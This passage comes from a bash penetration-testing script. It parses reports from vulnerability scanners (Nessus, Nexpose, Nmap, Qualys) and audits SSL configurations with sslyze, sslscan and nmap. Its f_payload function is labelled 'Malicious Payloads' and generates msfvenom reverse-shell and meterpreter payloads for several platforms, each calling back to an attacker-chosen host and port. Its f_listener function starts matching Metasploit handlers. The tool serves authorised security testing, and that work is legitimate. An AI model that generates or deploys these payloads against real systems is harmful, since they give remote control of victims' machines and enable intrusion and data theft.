settings|PHP Version|Ping the remote host|POP3 Service STLS Command Support|Port scanner dependency|Port scanners settings|Post-Scan Rules Application|Post-Scan Status|Protected Web Page Detection|RADIUS Server Detection|RDP Screenshot|RealPlayer Detection|Record Route|Remote listeners enumeration \(Linux \/ AIX\)|Remote web server screenshot|Reputation of Windows Executables: Known Process\(es\)|Reputation of Windows Executables: Unknown Process\(es\)|RHEV Settings|RIP Detection|RMI Registry Detection|RPC portmapper \(TCP\)|RPC portmapper Service Detection|RPC Services Enumeration|Salesforce.com Settings|Samba Server Detection|SAP Dynamic Information and Action Gateway Detection|SAProuter Detection|Service Detection \(GET request\)|Service Detection \(HELP Request\)|slident \/ fake identd Detection|Service Detection \(2nd Pass\)|Service Detection: 3 ASCII Digit Code Responses|SMB : Disable the C$ and ADMIN$ shares after the scan (WMI)|SMB : Enable the C$ and ADMIN$ shares during the scan \(WMI\)|SMB Registry : Start the Registry Service during the scan|SMB Registry : Start the Registry Service during the scan \(WMI\)|SMB Registry : Starting the Registry Service during the scan failed|SMB Registry : Stop the Registry Service after the scan|SMB Registry : Stop the Registry Service after the scan \(WMI\)|SMB Registry : Stopping the Registry Service after the scan failed|SMB QuickFixEngineering \(QFE\) Enumeration|SMB Scope|SMTP Server Connection Check|SMTP Service STARTTLS Command Support|SMTP settings|smtpscan SMTP Fingerprinting|Snagit Installed|SNMP settings|SNMP Supported Protocols Detection|SNMPc Management Server Detection|SOCKS Server Detection|SolarWinds TFTP Server Installed|Spybot Search & Destroy Detection|SquirrelMail Detection|SSH Algorithms and Languages Supported|SSH Protocol Versions Supported|SSH Server Type and Version Information|SSH settings|SSL \/ TLS Versions Supported|SSL Certificate Information|SSL Cipher Block Chaining Cipher Suites Supported|SSL Cipher Suites Supported|SSL Compression Methods Supported|SSL Perfect Forward Secrecy Cipher Suites Supported|SSL Resume With Different Cipher Issue|SSL Service Requests Client Certificate|SSL Session Resume Supported|SSL\/TLS Service Requires Client Certificate|Strict Transport Security \(STS\) Detection|Subversion Client/Server Detection \(Windows\)|Symantec Backup Exec Server \/ System Recovery Installed|Symantec Encryption Desktop Installed|Symantec Endpoint Protection Manager Installed \(credentialed check\)|Symantec Veritas Enterprise Administrator Service \(vxsvc\) Detection|TCP\/IP Timestamps Supported|TeamViewer Version Detection|Tenable Appliance Check \(deprecated\)|Terminal Services Use SSL\/TLS|Thunderbird Installed \(Mac OS X\)|Time of Last System Startup|TLS Next Protocols Supported|TLS NPN Supported Protocol Enumeration|Traceroute Information|Unknown Service Detection: Banner Retrieval|UPnP Client Detection|VERITAS Backup Agent Detection|VERITAS NetBackup Agent Detection|Viscosity VPN Client Detection \(Mac OS X\)|VMware vCenter Detect|VMware vCenter Orchestrator Installed|VMware ESX\/GSX Server detection|VMware SOAP API Settings|VMware vCenter SOAP API Settings|VMware Virtual Machine Detection|VMware vSphere Client Installed|VMware vSphere Detect|VNC Server Security Type Detection|VNC Server Unencrypted Communication Detection|vsftpd Detection|Wake-on-LAN|Web Application Firewall Detection|Web Application Tests Settings|Web mirroring|Web Server Directory Enumeration|Web Server Harvested Email Addresses|Web Server HTTP Header Internal IP Disclosure|Web Server Load Balancer Detection|Web Server No 404 Error Code Check|Web Server robots.txt Information Disclosure|Web Server UDDI Detection|Window Process Information|Window Process Module Information|Window Process Unique Process Name|Windows Compliance Checks|Windows ComputerSystemProduct Enumeration \(WMI\)|Windows Display Driver Enumeration|Windows DNS Server Enumeration|Windows Management Instrumentation \(WMI\) Available|Windows NetBIOS \/ SMB Remote Host Information Disclosure|Windows Prefetch Folder|Windows Product Key Retrieval|WinSCP Installed|Wireless Access Point Detection|Wireshark \/ Ethereal Detection \(Windows\)|WinZip Installed|WMI Anti-spyware Enumeration|WMI Antivirus Enumeration|WMI Bluetooth Network Adapter Enumeration|WMI Encryptable Volume Enumeration|WMI Firewall Enumeration|WMI QuickFixEngineering \(QFE\) Enumeration|WMI Server Feature Enumeration|WMI Trusted Platform Module Enumeration|Yosemite Backup Service Driver Detection|ZENworks Remote Management Agent Detection)" nessus.csv > tmp.csv

     # Delete additional findings with CVSS score of 0
     egrep -v "(Acronis Agent Detection \(TCP\)|Acronis Agent Detection \(UDP\)|Additional DNS Hostnames|Adobe AIR Detection|Adobe Reader Enabled in Browser \(Internet Explorer\)|Adobe Reader Enabled in Browser \(Mozilla firefox\)|Alert Standard Format \/ Remote Management and Control Protocol Detection|Amazon Web Services Settings|Apache Banner Linux Distribution Disclosure|Apache Tomcat Default Error Page Version Detection|Apple TV Detection|Apple TV Version Detection|Authentication Failure - Local Checks Not Run|CA ARCServe UniversalAgent Detection|CA BrightStor ARCserve Backup Discovery Service Detection|Citrix Licensing Service Detection|Citrix Server Detection|COM+ Internet Services \(CIS\) Server Detection|Crystal Reports Central Management Server Detection|Data Execution Prevention \(DEP\) is Disabled|Daytime Service Detection|DB2 Connection Port Detection|Discard Service Detection|DNS Server BIND version Directive Remote Version Disclosure|DNS Server Detection|DNS Server hostname.bind Map Hostname Disclosure|Do not scan Novell NetWare|Do not scan printers|Do not scan printers \(AppSocket\)|Dropbox Installed \(Mac OS X\)|Dropbox Software Detection \(uncredentialed check\)|Enumerate IPv4 Interfaces via SSH|Echo Service Detection|EMC Replication Manager Client Detection|Enumerate IPv6 Interfaces via SSH|Enumerate MAC Addresses via SSH|Exclude top-level domain wildcard hosts|H323 Protocol \/ VoIP Application Detection|Host Authentication Failure\(s\) for Provided Credentials|HP LoadRunner Agent Service Detection|HP Integrated Lights-Out \(iLO\) Detection|IBM Tivoli Storage Manager Client Acceptor Daemon Detection|IBM WebSphere MQ Listener Detection|ICMP Timestamp Request Remote Date Disclosure|Identd Service Detection|Inconsistent Hostname and IP Address|Ingres Communications Server Detection|Internet Cache Protocol \(ICP\) Version 2 Detection|IPSEC Internet Key Exchange \(IKE\) Detection|IPSEC Internet Key Exchange \(IKE\) Version 1 Detection|iTunes Music Sharing Enabled|iTunes Version Detection \(Mac OS X\)|JavaScript Enabled in Adobe Reader|IPSEC Internet Key Exchange \(IKE\) Version 2 Detection|iSCSI Target Detection|LANDesk Ping Discovery Service Detection|Link-Local Multicast Name Resolution \(LLMNR\) Detection|LPD Detection|mDNS Detection \(Local Network\)|Microsoft IIS 404 Response Service Pack Signature|Microsoft SharePoint Server Detection|Microsoft SQL Server Detection \(credentialed check\)|Microsoft SQL Server TCP\/IP Listener Detection|Microsoft SQL Server UDP Query Remote Version Disclosure|Microsoft Windows Installed Software Enumeration \(credentialed check\)|Microsoft Windows Messenger Detection|Microsoft Windows Mounted Devices|Microsoft Windows Security Center Settings|Microsoft Windows SMB Fully Accessible Registry Detection|Microsoft Windows SMB LsaQueryInformationPolicy Function SID Enumeration|Microsoft Windows SMB Registry Not Fully Accessible Detection|Microsoft Windows SMB Share Hosting Possibly Copyrighted Material|Microsoft Windows SMB : WSUS Client Configured|Microsoft Windows Startup Software Enumeration|Microsoft Windows Summary of Missing Patches|NIS Server Detection|Nessus SYN scanner|Nessus TCP scanner|Nessus UDP scanner|Nessus Windows Scan Not Performed with Admin Privileges|Netscape Enterprise Server Default Files Present|NetVault Process Manager Service Detection|NFS Server Superfluous|News Server \(NNTP\) Information Disclosure|NNTP Authentication Methods|OEJP Daemon Detection|Open Port Re-check|OpenVAS Manager \/ Administrator Detection|Oracle Database Detection|Oracle Database tnslsnr Service Remote Version Disclosure|Oracle Java JRE Enabled \(Google Chrome\)|Oracle Java JRE Enabled \(Internet Explorer\)|Oracle Java JRE Enabled \(Mozilla firefox\)|Oracle Java JRE Premier Support and Extended Support Version Detection|Oracle Java JRE Universally Enabled|Panda AdminSecure Communications Agent Detection|Patch Report|PCI DSS compliance : Insecure Communication Has Been Detected|Pervasive PSQL \/ Btrieve Server Detection|OSSIM Server Detection|POP Server Detection|PostgreSQL Server Detection|PPTP Detection|QuickTime for Windows Detection|Quote of the Day \(QOTD\) Service Detection|Reverse NAT\/Intercepting Proxy Detection|RMI Remote Object Detection|RPC rstatd Service Detection|rsync Service Detection|RTMP Server Detection|RTSP Server Type \/ Version Detection|Session Initiation Protocol Detection|SFTP Supported|Skype Detection|Skype for Mac Installed \(credentialed check\)|Skype Stack Version Detection|SLP Server Detection \(TCP\)|SLP Server Detection \(UDP\)|SMTP Authentication Methods|SMTP Server Detection|SNMP Protocol Version Detection|SNMP Query Installed Software Disclosure|SNMP Query Routing Information Disclosure|SNMP Query Running Process List Disclosure|SNMP Query System Information Disclosure|SNMP Request Network Interfaces Enumeration|Software Enumeration \(SSH\)|SSL Root Certification Authority Certificate Information|SSL Certificate Chain Contains Certificates Expiring Soon|SSL Certificate Chain Contains RSA Keys Less Than 2048 bits|SSL Certificate Chain Contains Unnecessary Certificates|SSL Certificate Chain Not Sorted|SSL Certificate 'commonName' Mismatch|SSL Certificate Expiry - Future Expiry|SuperServer Detection|Symantec pcAnywhere Detection \(TCP\)|Symantec pcAnywhere Status Service Detection \(UDP\)|TCP Channel Detection|Telnet Server Detection|TFTP Daemon Detection|Universal Plug and Play \(UPnP\) Protocol Detection|Unix Operating System on Extended Support|USB Drives Enumeration \(WMI\)|VMware Fusion Version Detection \(Mac OS X\)|WebDAV Detection|Web Server \/ Application favicon.ico Vendor Fingerprinting|Web Server Crafted Request Vendor/Version Information Disclosure|Web Server on Extended Support|Web Server SSL Port HTTP Traffic Detection|Web Server Unconfigured - Default Install Page Present|Web Server UPnP Detection|Windows Terminal Services Enabled|WINS Server Detection|X Font Service Detection)" tmp.csv > tmp2.csv

     # Delete additional findings.
     egrep -v '(DHCP Server Detection|mDNS Detection \(Remote Network\))' tmp2.csv > tmp3.csv

     # Clean up
     cat tmp3.csv | sed 's/Algorithm :/Algorithm:/g; s/are :/are:/g; s/authorities :/authorities:/g; s/authority :/authority:/g; s/Banner           :/Banner:/g; s/ (banner check)//; s/before :/before/g; s/combinations :/combinations:/g; s/ (credentialed check)//; s/expired :/expired:/g; s/Here is the list of medium strength SSL ciphers supported by the remote server: Medium Strength Ciphers //g; s/httpOnly/HttpOnly/g; s/ (intrusive check)//g; s/is :/is:/g; s/P   /P /g; s/Issuer           :/Issuer:/g; s/Issuer  :/Issuer:/g; s/List of 64-bit block cipher suites supported by the remote server: Medium Strength Ciphers //g; s/Nessus collected the following banner from the remote Telnet server:  //g; s/ (remote check)//; s/ (safe check)//; s/server :/server:/g; s/Service Pack /SP/g; s/Source            :/Source:/g; s/source    :/source:/g; s/Subject          :/Subject:/g; s/Subject :/Subject:/g; s/supported :/supported:/g; s/The following certificate was at the top of the certificate chain sent by the remote host, but it is signed by an unknown certificate authority:  |-//g; s/The following certificate was found at the top of the certificate chain sent by the remote host, but is self-signed and was not found in the list of known certificate authorities:  |-//g; s/The following certificate was part of the certificate chain sent by the remote host, but it has expired :  |-//g; s/The following certificates were part of the certificate chain sent by the remote host, but they have expired :  |-//g; s/The following certificates were part of the certificate chain sent by the remote host, but contain hashes that are considered to be weak.  |-//g; s/The identities known by Nessus are: //g; s/ (uncredentialed check)//g; s/ (version check)//g; s/()//g; s/(un)//g; s/users :/users:/g; s/version     :/version:/g; s/version    :/version:/g; s/version  :/version:/g; s/version :/version:/g; s/             :/:/g; s/:     /: /g; s/:    /: /g; s/"   /"/g; s/"  /"/g; s/" /"/g; s/"h/" h/g; s/.   /. /g' > $home/data/nessus-`date +%H:%M:%S`.csv

     rm nessus* tmp*

     echo
     echo $medium
     echo
     printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/nessus-`date +%H:%M:%S`.csv
     echo
     echo
     exit
     ;;

     3)
     f_location
     parsers/parse-nexpose.py $location

     mv nexpose.csv $home/data/nexpose-`date +%H:%M:%S`.csv

     echo
     echo $medium
     echo
     printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/nexpose-`date +%H:%M:%S`.csv
     echo
     echo
     exit
     ;;

     4)
     f_location
     cp $location ./nmap.xml
     parsers/parse-nmap.py
     mv nmap.csv $home/data/nmap-`date +%H:%M:%S`.csv
     rm nmap.xml

     echo
     echo $medium
     echo
     printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/nmap-`date +%H:%M:%S`.csv
     echo
     echo
     exit
     ;;

     5)
     f_location
     echo
     echo "[!] This will take about 2.5 mins, be patient."
     echo

     parsers/parse-qualys.py $location
     mv qualys.csv $home/data/qualys-`date +%H:%M:%S`.csv

     echo
     echo $medium
     echo
     printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/qualys-`date +%H:%M:%S`.csv
     echo
     echo
     exit
     ;;

     6) f_main;;
     *) f_error;;
esac
}

##############################################################################################################

f_ssl(){
clear
f_banner

echo -e "\x1B[1;34mCheck for SSL certificate issues.\x1B[0m"
echo
echo "List of IP:port."
echo

f_location

echo
echo $medium
echo
echo "Running sslyze."
sslyze --targets_in=$location --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers > tmp
# Remove the first 20 lines and cleanup
sed '1,20d' tmp | egrep -v '(=>|error:|ERROR|is trusted|NOT SUPPORTED|OK - Supported|OpenSSLError|Server rejected|timeout|unexpected error)' |
# Find FOO, if the next line is blank, delete both lines
awk '/Compression/ { Compression = 1; next }  Compression == 1 && /^$/ { Compression = 0; next }  { Compression = 0 }  { print }' |
awk '/Renegotiation/ { Renegotiation = 1; next }  Renegotiation == 1 && /^$/ { Renegotiation = 0; next }  { Renegotiation = 0 }  { print }' |
awk '/Resumption/ { Resumption = 1; next }  Resumption == 1 && /^$/ { Resumption = 0; next }  { Resumption = 0 }  { print }' |
awk '/SSLV2/ { SSLV2 = 1; next }  SSLV2 == 1 && /^$/ { SSLV2 = 0; next }  { SSLV2 = 0 }  { print }' |
awk '/SSLV3/ { SSLV3 = 1; next }  SSLV3 == 1 && /^$/ { SSLV3 = 0; next }  { SSLV3 = 0 }  { print }' |
awk '/Stapling/ { Stapling = 1; next }  Stapling == 1 && /^$/ { Stapling = 0; next }  { Stapling = 0 }  { print }' |
awk '/Unhandled/ { Unhandled = 1; next }  Unhandled == 1 && /^$/ { Unhandled = 0; next }  { Unhandled = 0 }  { print }' |
# Find a dash (-), if the next line is blank, delete it
awk -v n=-2 'NR==n+1 && !NF{next} /-/ {n=NR}1' |
# Remove double spacing
cat -s > $home/data/sslyze.txt

echo
echo "Running sslscan."
echo

START=$(date +%r\ %Z)

echo > tmp
echo $medium >> tmp
echo >> tmp

number=$(wc -l $location | cut -d ' ' -f1)
N=0

while read -r line; do
     echo $line > ssl_$line
     N=$((N+1))

     echo -n "[$N/$number]  $line"
     sslscan --ipv4 --show-certificate --ssl2 --ssl3 --tlsall --no-colour $line > tmp_$line

     echo "... completed."
     echo >> ssl_$line

     if [ -e tmp_$line ]; then
          error=$(grep 'ERROR:' tmp_$line)

          if [[ ! $error ]]; then
               issuer=$(grep 'Issuer: ' tmp_$line)

               if [[ $issuer ]]; then
                    grep 'Issuer:' tmp_$line | sed 's/    Issuer: /    Issuer:  /g' >> ssl_$line
               else
                    echo "Issuer info not available." >> ssl_$line
                    echo >> ssl_$line
               fi

               subject=$(grep 'Subject:' tmp_$line)

               if [[ $subject ]]; then
                    grep 'Subject:' tmp_$line >> ssl_$line
                    echo >> ssl_$line
               else
                    echo "Certificate subject info not available." >> ssl_$line
                    echo >> ssl_$line
               fi

               dns=$(grep 'DNS:' tmp_$line)

               if [[ $dns ]]; then
                    grep 'DNS:' tmp_$line | sed 's/        DNS:/    DNS:/g' >> ssl_$line
                    echo >> ssl_$line
               fi

               A=$(grep -i 'MD5WithRSAEncryption' tmp_$line)

               if [[ $A ]]; then
                    echo "[*] MD5-based Signature in TLS/SSL Server X.509 Certificate" >> ssl_$line
                    grep -i 'MD5WithRSAEncryption' tmp_$line >> ssl_$line
                    echo >> ssl_$line
               fi

               B=$(grep 'NULL' tmp_$line)

               if [[ $B ]]; then
                    echo "[*] NULL Ciphers" >> ssl_$line
                    grep 'NULL' tmp_$line >> ssl_$line
                    echo >> ssl_$line
               fi

               C=$(grep 'SSLv2' tmp_$line)

               if [[ $C ]]; then
                    echo "[*] TLS/SSL Server Supports SSLv2" >> ssl_$line
                    grep 'SSLv2' tmp_$line > ssltmp2_$line
                    sed '/^    SSL/d' ssltmp2_$line >> ssl_$line
                    echo >> ssl_$line
               fi

               D=$(grep ' 40 bits' tmp_$line)
               D2=$(grep ' 56 bits' tmp_$line)

               if [[ $D || $D2 ]]; then
                    echo "[*] TLS/SSL Server Supports Weak Cipher Algorithms" >> ssl_$line
                    grep ' 40 bits' tmp_$line >> ssl_$line
                    grep ' 56 bits' tmp_$line >> ssl_$line
                    echo >> ssl_$line
               fi

               expmonth=$(grep 'Not valid after:' tmp_$line | awk '{print $4}')

               if [ "$expmonth" == "Jan" ]; then monthnum="01"; fi
               if [ "$expmonth" == "Feb" ]; then monthnum="02"; fi
               if [ "$expmonth" == "Mar" ]; then monthnum="03"; fi
               if [ "$expmonth" == "Apr" ]; then monthnum="04"; fi
               if [ "$expmonth" == "May" ]; then monthnum="05"; fi
               if [ "$expmonth" == "Jun" ]; then monthnum="06"; fi
               if [ "$expmonth" == "Jul" ]; then monthnum="07"; fi
               if [ "$expmonth" == "Aug" ]; then monthnum="08"; fi
               if [ "$expmonth" == "Sep" ]; then monthnum="09"; fi
               if [ "$expmonth" == "Oct" ]; then monthnum="10"; fi
               if [ "$expmonth" == "Nov" ]; then monthnum="11"; fi
               if [ "$expmonth" == "Dec" ]; then monthnum="12"; fi

               expyear=$(grep 'Not valid after:' tmp_$line | awk '{print $7}')
               expday=$(grep 'Not valid after:' tmp_$line | awk '{print $5}')
               expdate=$(echo $expyear-$monthnum-$expday)
               datenow=$(date +%F)

               date2stamp(){
               date --utc --date "$1" +%s
               }

               datenowstamp=$(date2stamp $datenow)
               expdatestamp=$(date2stamp $expdate)

               certissuedate=$(grep 'Not valid before:' tmp_$line)
               fmt_certissuedate=$(echo $certissuedate | sed 's/Not valid before:/Certificate Issue Date:/')

               certexpiredate=$(grep 'Not valid after:' tmp_$line)
               fmt_certexpiredate=$(echo $certexpiredate | sed 's/Not valid after:/Certificate Expiry Date:/')

               echo "    $fmt_certissuedate" >> ssl_$line
               echo "    $fmt_certexpiredate" >> ssl_$line
               echo >> ssl_$line

               if (($expdatestamp < $datenowstamp)); then
                    echo "[*] X.509 Server Certificate is Invalid/Expired" >> ssl_$line
                    echo "    Cert Expire Date: $expdate" >> ssl_$line
                    echo >> ssl_$line
               fi

               E=$(grep 'Authority Information Access' tmp_$line)

               if [[ ! $E ]]; then
                    echo "[*] Self-signed TLS/SSL Certificate" >> ssl_$line
                    echo >> ssl_$line
               fi

               echo $medium >> ssl_$line
               echo >> ssl_$line
               cat ssl_$line >> tmp
          else
               echo -e "\x1B[1;31mCould not open a connection.\x1B[0m"
               echo "[*] Could not open a connection." >> ssl_$line
               echo >> ssl_$line
               echo $medium >> ssl_$line
               echo >> ssl_$line
               cat ssl_$line >> tmp
          fi
     else
          echo -e "\x1B[1;31mNo response.\x1B[0m"
          echo "[*] No response." >> ssl_$line
          echo >> ssl_$line
          echo $medium >> ssl_$line
          echo >> ssl_$line
          cat ssl_$line >> tmp
     fi
done < "$location"


END=$(date +%r\ %Z)

echo "sslscan Report" > tmp2
date +%A" - "%B" "%d", "%Y >> tmp2
echo >> tmp2
echo "Start time   $START" >> tmp2
echo "Finish time  $END" >> tmp2
echo "Scanner IP   $ip" >> tmp2

mv tmp2 $home/data/sslscan.txt

grep -v 'Issuer info not available.' tmp | grep -v 'Certificate subject info not available.' >> $home/data/sslscan.txt

# Nmap
echo
echo "Running nmap."
echo

cat $location | cut -d ':' -f1 > tmp
nmap -Pn -n -T4 --open -p443 --script=ssl* tls-ticketbleed -iL tmp > tmp2
egrep -v '( - A|before|Ciphersuite|cipher preference|deprecated)' tmp2 |
# Find FOO, if the next line is blank, delete both lines
awk '/latency/ { latency = 1; next }  latency == 1 && /^$/ { latency = 0; next }  { latency = 0 }  { print }' |
# Find FOO, if the next line is blank, delete the line containing FOO
awk -v n=-2 'NR==n+1 && NF{print hold} /sslv2-drown/ {n=NR;hold=$0;next}1' |
awk -v n=-2 'NR==n+1 && NF{print hold} /least strength/ {n=NR;hold=$0;next}1' |
awk -v n=-2 'NR==n+1 {if($0 ~ /NULL/) { next; } else { print hold } } /compressors/ {n=NR;hold=$0;next}1' |
sed 's/Nmap scan report for //g' > $home/data/nmap-ssl.txt

rm tmp* ssl_* 2>/dev/null

echo
echo $medium
echo
echo "***Scan complete.***"
echo
echo
echo -e "The new reports are located at \x1B[1;33m$home/data/sslscan.txt, sslyze.txt, \x1B[0mand \x1B[1;33mnmap-ssl.txt \x1B[0m"
echo
echo
exit
}

##############################################################################################################

f_payload(){
clear
f_banner
echo -e "\x1B[1;34mMalicious Payloads\x1B[0m"
echo
echo "1.   android/meterpreter/reverse_tcp"
echo "2.   cmd/windows/reverse_powershell"
echo "3.   java/jsp_shell_reverse_tcp"
echo "4.   linux/x64/shell_reverse_tcp"
echo "5.   linux/x86/meterpreter/reverse_tcp"
echo "6.   osx/x64/shell_reverse_tcp"
echo "7.   php/meterpreter/reverse_tcp"
echo "8.   windows/meterpreter/reverse_tcp"
echo "9.   windows/meterpreter/reverse_tcp (ASP)"
echo "10.  windows/x64/meterpreter/reverse_tcp"
echo "11.  Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1) payload="android/meterpreter/reverse_tcp"
          extention=".apk"
          format="raw"
          arch="dalvik"
          platform="android";;
     2) payload="cmd/windows/reverse_powershell"
          extention=".bat"
          format="raw"
          arch="cmd"
          platform="windows";;
     3) payload="java/jsp_shell_reverse_tcp"
          extention=".jsp"
          format="raw"
          arch="cmd"
          platform="windows";;
     4) payload="linux/x64/shell_reverse_tcp"
          extention=""
          format="elf"
          arch="x64"
          platform="linux";;
     5) payload="linux/x86/meterpreter/reverse_tcp"
          extention=""
          format="elf"
          arch="x86"
          platform="linux";;
     6) payload="osx/x64/shell_reverse_tcp"
          extention=""
          format="macho"
          arch="x64"
          platform="osx";;
     7) payload="php/meterpreter/reverse_tcp"
          extention=".php"
          format="raw"
          arch="php"
          platform="php"
          encoder="php/base64";;
     8) payload="windows/meterpreter/reverse_tcp"
          extention=".exe"
          format="exe"
          arch="x86"
          platform="windows";;
     9) payload="windows/meterpreter/reverse_tcp (ASP)"
          extention=".asp"
          format="asp"
          arch="x86"
          platform="windows";;
     10) payload="windows/x64/meterpreter/reverse_tcp"
          extention=".exe"
          format="exe"
          arch="x64"
          platform="windows";;
     11) f_main;;
     *) f_error;;
esac

echo
echo -n "LHOST: "
read lhost

# Check for no answer
if [[ -z $lhost ]]; then
     lhost=$ip
     echo "Using $ip"
     echo
fi

echo -n "LPORT: "
read lport

# Check for valid port number.
if [[ $lport -lt 1 || $lport -gt 65535 ]]; then
     f_error
fi

if [[ $payload == "php/meterpreter/reverse_tcp" ]]; then
     echo
     $msfv -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -o $home/data/payload$extention
else
     echo
     $msfv -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -o $home/data/payload-$platform-$arch$extention
fi

echo
echo
exit
}

##############################################################################################################

f_listener(){
clear
f_banner
echo -e "\x1B[1;34mMetasploit Listeners\x1B[0m"
echo
echo "1.  android/meterpreter/reverse_tcp"
echo "2.  cmd/windows/reverse_powershell"
echo "3.  java/jsp_shell_reverse_tcp"
echo "4.  linux/x64/shell_reverse_tcp"
echo "5.  linux/x86/meterpreter/reverse_tcp"
echo "6.  osx/x64/shell_reverse_tcp"
echo "7.  php/meterpreter/reverse_tcp"
echo "8.  windows/meterpreter/reverse_tcp"
echo "9.  windows/x64/meterpreter/reverse_tcp"
echo "10. Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1) payload="android/meterpreter/reverse_tcp";;
     2) payload="cmd/windows/reverse_powershell";;
     3) payload="java/jsp_shell_reverse_tcp";;
     4) payload="linux/x64/shell_reverse_tcp";;
     5) payload="linux/x86/meterpreter/reverse_tcp";;
     6) payload="osx/x64/shell_reverse_tcp";;
     7) payload="php/meterpreter/reverse_tcp";;
     8) payload="windows/meterpreter/reverse_tcp";;
     9) payload="windows/x64/meterpreter/reverse_tcp";;
     10) f_main;;
     *) f_error;;
esac

echo
echo -n "LHOST: "
read lhost

# Check for no answer
if [[ -z $lhost ]]; then
     lhost=$ip
     echo "Using $ip"
     echo
fi

echo -n "LPORT: "
read lport
echo

# Check for valid port number.
if [[ $lport -lt 1 || $lport -gt 65535 ]]; then
     f_error
fi

# Check for root when binding to a low port
if [[ $lport -lt 1025 && "$(id -u)" != "0" ]]; then
     echo "You must be root to bind to a port that low."
     sleep 3
     f_error
fi

cp $discover/resource/listener.rc /tmp/

# Check for OS X
if [[ `uname` == 'Darwin' ]]; then
     sed -i '' "s|aaa|$payload|g" /tmp/listener.rc
     sed -i '' "s/bbb/$lhost/g" /tmp/listener.rc
     sed -i '' "s/ccc/$lport/g" /tmp/listener.rc
else
     sed -i "s|aaa|$payload|g" /tmp/listener.rc
     sed -i "s/bbb/$lhost/g" /tmp/listener.rc
     sed -i "s/ccc/$lport/g" /tmp/listener.rc
fi

x=`ps aux | grep 'postgres' | grep -v 'grep'`

if [[ -z $x ]]; then
     echo
     service postgresql start
fi

$msf -r /tmp/listener.rc

echo
echo
exit
}

##############################################################################################################

f_updates(){
# Remove nmap scripts not being used
ls -l /usr/share/nmap/scripts/ | awk '{print $9}' | cut -d '.' -f1 | egrep -v '(address-info|ajp-auth|ajp-headers|allseeingeye-info|asn-query|auth-owners|auth-spoof|broadcast|brute|citrix-enum-apps-xml|citrix-enum-servers-xml|clock-skew|creds-summary|daap-get-library|discover|dns-brute|dns-check-zone|dns-client-subnet-scan|dns-fuzz|dns-ip6-arpa-scan|dns-srv-enum|dns-nsec3-enum|domcon-cmd|duplicates|eap-info|fcrdns|fingerprint-strings|firewalk|firewall-bypass|ftp-libopie|ftp-libopie|ganglia-info|hnap-info|hostmap-bfk|hostmap-ip2hosts|hostmap-robtex|http|iax2-version|informix-query|informix-tables|ip-forwarding|ip-geolocation|ipidseq|ipv6|irc-botnet-channels|irc-info|irc-unrealircd-backdoor|isns-info|jdwp-exec|jdwp-info|jdwp-inject|krb5-enum-users|ldap-novell-getpass|ldap-search|llmnr-resolve|metasploit-info|mmouse-exec|ms-sql-config|mrinfo|ms-sql-hasdbaccess|ms-sql-query|ms-sql-tables|ms-sql-xp-cmdshell|mtrace|murmur-version|mysql-audit|mysql-enum|mysql-dump-hashes|mysql-query|nat-pmp-info|nat-pmp-mapport|netbus-info|ntp-info|omp2-enum-targets|oracle-enum-users|ovs-agent-version|p2p-conficker|path-mtu|pjl-y-message|quake1-info|quake3-info|quake3-master-getservers|qscan|resolveall|reverse-index|rpc-grind|rpcap-info|rusers|shodan-api|script|sip-call-spoof|skypev2-version|smb-flood|smb-ls|smb-print-text|smb-psexec|sniffer-detect|snmp-ios-config|socks-open-proxy|sql-injection|ssh-hostkey|ssh2-enum-algos|sshv1|stun-info|teamspeak2-version|targets|tftp-enum|tor-consensus-checker|traceroute-geolocation|unittest|unusual-port|upnp-info|url-snarf|ventrilo-info|vtam-enum|vuln-cve|vuze-dht-info|weblogic-t3-info|whois|xmlrpc-methods|xmpp-info)' > tmp

grep 'script=' discover.sh | egrep -v '(discover.sh|22.txt|smtp.txt)' | cut -d '=' -f2- | cut -d ' ' -f1 | tr ',' '\n' | egrep -v '(db2-discover|dhcp-discover|dns-service-discovery|http-email-harvest|http-grep|membase-http-info|oracle-sid-brute|smb-os-discovery|tn3270-info)' | sort -u > tmp2

echo "New modules to be added." > tmp-updates
echo >> tmp-updates
echo >> tmp-updates
echo "Nmap scripts" >> tmp-updates
echo "==============================" >> tmp-updates

diff tmp tmp2 | egrep '^[<>]' | awk '{print $2}' | sed '/^$/d' | egrep -v '(clamav-exec|iec-identify|ntp-info|smb*|smtp-commands|smtp-enum-users|smtp-ntlm-info|smtp-open-relay|smtp-strangeport|smtp-vuln*|ssl*|tls-ticketbleed|tls-nextprotoneg|tmp)' >> tmp-updates

rm tmp

echo >> tmp-updates
echo >> tmp-updates
echo "Metasploit auxiliary/scanners" >> tmp-updates
echo "==============================" >> tmp-updates

# Not included: http sap

categories="afp backdoor chargen couchdb db2 dcerpc dect discovery emc finger ftp h323 imap ip ipmi lotus misc mongodb motorola msf mssql mysql natpmp nessus netbios nexpose nfs ntp openvas oracle pcanywhere pop3 portscan postgres printer rdp rogue rservices scada sip smb smtp snmp ssh telephony telnet tftp upnp vmware vnc voice vxworks winrm x11"

for i in $categories; do
     ls -l /usr/share/metasploit-framework/modules/auxiliary/scanner/$i | awk '{print $9}' | cut -d '.' -f1 >> tmp
done

sed '/^$/d' tmp > tmp2

# Remove Metasploit scanners not used
egrep -v '(ack|apache_karaf_command_execution|arp_sweep|call_scanner|cerberus_sftp_enumusers|cisco_smart_install|couchdb_enum|dvr_config_disclosure|empty_udp|endpoint_mapper|ftpbounce|hidden|indusoft_ntwebserver_fileaccess|ipidseq|ipv6|login|lotus_domino_hashes|lotus_domino_version|management|ms08_067_check|mysql_file_enum|mysql_hashdump|mysql_schemadump|mysql_writable_dirs|natpmp_portscan|poisonivy_control_scanner|profinet_siemens|psexec_loggedin_users|recorder|rogue_recv|rogue_send|sipdroid_ext_enum|snmp_set|ssh_enumusers|ssh_identify_pubkeys|station_scanner|syn|tcp|tftpbrute|udp_probe|udp_sweep|vmware_enum_users|vmware_enum_permissions|vmware_enum_sessions|vmware_enum_vms|vmware_host_details|vmware_screenshot_stealer|wardial|winrm_cmd|winrm_wql|xmas)' tmp2 | sort > tmp-msf-all

grep 'use ' $discover/resource/*.rc | grep -v 'recon-ng' > tmp

